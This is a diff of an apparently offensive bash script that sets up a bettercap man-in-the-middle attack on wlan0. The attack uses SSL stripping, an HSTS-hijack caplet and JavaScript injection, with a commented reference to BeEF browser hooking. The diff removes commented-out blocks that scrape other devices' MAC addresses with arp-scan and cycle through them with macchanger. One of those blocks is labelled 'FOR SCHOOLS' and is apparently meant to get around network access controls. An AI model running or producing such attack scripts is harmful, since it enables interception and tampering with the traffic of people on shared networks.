@@ -1,22 +1,5 @@
 #!/bin/bash
 
-: << 'COMMENT'
-		#CHANGING MAC-ADDRESS
-
-#Arraying mac-Addresses
-sudo arp-scan -l > mac
-awk '{ print $2}' mac > MA_only 
-grep ':' MA_only > ups
-rm mac MA_only
-mapfile -t array <ups
-#rm -rf ups
-
-    sudo ifconfig wlan0 down && sudo macchanger -m ${array[$i]} wlan0 && sudo ifconfig wlan0 up
-COMMENT
-
-
-
-
 wget -q --spider http://google.com
 
 if [ $? -eq 0 ]; 
@@ -45,13 +28,10 @@ c=$(hostname -I) && d=$(echo -n "${c//[[:space:]]/}")
 
 #make sure to install bettercap and also update the caplets
 
-
 	#scripting bettercap caplet
 #make sure also run caplets.update for the first time and get all caplets then replace the hstshijack with the one that comes with this file
 sudo rm -rfv /usr/local/share/bettercap/caplets/hstshijack
 sudo cp -rfv hstshijack /usr/local/share/bettercap/caplets
-
-
 
 #starting beef-xss in new terminal
 #gnome-terminal -- sudo beef-xss
@@ -62,39 +42,7 @@ echo -e $"net.probe on\nset http.proxy.sslstrip true\nset http.proxy.inject.js $
 pkill -9 -f bettercap
 sudo bettercap -iface wlan0 -caplet spoof.cap
 
-
-
-
 else
 #internet not connected
     echo "Check your internet connection!"
 fi
-
-
-
-
-
-
-
-: << 'COMMENT'
-
-		#FOR SCHOOLS
-		
-#Arraying mac-Addresses
-sudo arp-scan -l > mac
-awk '{ print $2}' mac > MA_only
-grep ':' MA_only > ups
-rm mac MA_only
-mapfile -t array <ups
-#rm -rf ups
-
-i=0
-len=${#array[@]}
-wget -q --spider http://google.com
-until [ $? -eq 0 ];
-do
-    sudo ifconfig wlan0 down && sudo macchanger -m ${array[$i]} wlan0 && sudo ifconfig wlan0 up
-    let i++
-done
-
-COMMENT
